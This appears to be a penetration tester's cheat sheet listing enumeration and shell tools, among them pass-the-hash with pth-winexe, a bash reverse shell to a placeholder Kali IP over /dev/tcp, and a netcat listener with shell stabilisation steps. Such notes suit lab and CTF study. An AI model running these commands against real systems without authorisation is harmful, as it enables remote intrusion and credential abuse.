````markdown
## Useful Commands for Enumeration, Shells, and Exploitation

### Shell Access & Privilege Utilities

- `winexe` – To spawn a CMD shell  
- `pth-winexe` – To spawn a CMD shell by passing the NTLM hash  
- `(Ubuntu) getcap` – To check capabilities of binaries with elevated privileges  
- `ltrace` – Debugging tool to trace library calls  
- `whatweb` – To quickly get web application and server details  
- `dirb`, `gobuster` – Directory brute-forcing tools  
- `ffuf` – Fast web fuzzer for finding subdomains or directories  
- `grep -rni "String" *` – Recursively search for a string in a directory (case-insensitive)  
- `enum4linux` – SMB enumeration tool (sometimes very handy)  

### Shell Spawning

To spawn a stable interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

To spawn a reverse shell from the victim machine:

```bash
bash -i >& /dev/tcp/<kali-ip>/<desired-port> 0>&1
```

To stabilize the shell after suspending with Ctrl+Z:

```bash
stty raw -echo; fg
```

To use arrow keys and tab completion with Netcat:

```bash
rlwrap nc -lvnp <port>
````
